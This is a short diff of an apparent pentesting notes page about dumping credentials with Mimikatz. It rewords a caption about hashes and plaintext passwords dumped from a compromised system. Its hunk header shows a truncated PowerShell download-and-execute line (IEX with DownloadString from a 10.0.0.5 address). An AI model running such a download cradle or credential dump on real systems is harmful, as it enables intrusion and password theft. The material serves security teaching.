@@ -16,7 +16,7 @@ powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-Below is the attacker's view - both hashes and plain text passwords of the compromised system are dumped to the screen:
+Hashes and plain text passwords of the compromised system are dumped to the console:
 
 ![](../../.gitbook/assets/pwdump-mimikatz-results.png)
 
